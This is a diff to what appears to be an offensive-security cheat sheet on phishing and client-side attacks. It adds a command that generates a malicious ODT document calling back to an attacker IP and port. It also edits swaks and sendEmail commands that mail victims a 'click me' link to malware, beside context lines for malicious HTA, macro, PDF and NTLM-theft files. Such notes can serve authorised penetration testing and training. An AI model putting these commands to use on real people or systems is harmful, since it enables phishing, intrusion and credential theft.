@@ -10,8 +10,8 @@ canarytokens.com # generate a fake url to collect victim data
 ## Attacks
 
 > [evil_macro.py](https://github.com/rodolfomarianocy/Evil-Macro/)
-
 > [malicious-pdf.py](https://github.com/jonaslejon/malicious-pdf)
+> [MMG-LO](https://github.com/0bfxgh0st/MMG-LO)
 
 ```shell
 # create a malicious HTA with msfvenom
@@ -22,6 +22,9 @@ python evil_macro.py -l <ip> -p <port> -o macro.txt
 
 # generate a malicious PDF file
 python3 malicious-pdf.py burp-collaborator-url
+
+# generate a malicious odt file
+python mmg-odt.py windows <ip> <port> 
 ```
 
 ### Windows Library
@@ -81,7 +84,7 @@ python ntlm_theft/ntlm_theft.py --g lnk -s 192.168.45.191 -f Services
 ### Sending Emails
 
 ```shell
-swaks -t <VICTIM_EMAIL> -f <YOUR_FAKE_EMAIL> --server <SMTP_EMAIL> --body 'click me http://<YOUR_IP>/<MALWARE>' --header "Subject: Important" --add-header "Really: 1.0" --add-header "Content-Type: text/html"  [--attach <ATTACHED_FILE>]
+swaks -t <victim(s)_email> -f <from_email> --server <smtp_server> --body 'click me http://<YOUR_IP>/<MALWARE>' --header "Subject: Important" --add-header "Really: 1.0" --add-header "Content-Type: text/html"  [--attach <ATTACHED_FILE>]
 
-sendEmail -t nico@megabank.com -u open -m yes -a yes.rtf -s 10.10.10.77 -f user@megabank.com
+sendEmail -t <victim(s)_email> -u <subject> -m <message> -a <attachment> -s <smtp_server> -f <from_email>
 ```
